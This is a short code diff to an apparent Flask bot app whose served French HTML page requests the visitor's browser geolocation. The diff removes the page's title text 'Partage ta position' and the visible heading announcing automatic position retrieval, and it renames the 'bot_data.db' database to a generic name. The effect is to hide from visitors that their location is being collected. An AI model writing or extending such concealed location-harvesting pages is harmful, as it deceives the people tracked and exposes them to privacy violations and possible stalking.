@@ -10,7 +10,7 @@ import os
 # =========================================================
 app = Flask(__name__)
 
-engine = create_engine("sqlite:///bot_data.db", echo=False)
+engine = create_engine("sqlite:///database.db", echo=False)
 Base = declarative_base()
 Session = sessionmaker(bind=engine)
 session = Session()
@@ -46,10 +46,9 @@ HTML_PAGE = """
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>📍 Partage ta position</title>
+<title>📍</title>
 </head>
 <body>
-<h2>📍 Récupération automatique de ta position...</h2>
 <script>
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(success, error);
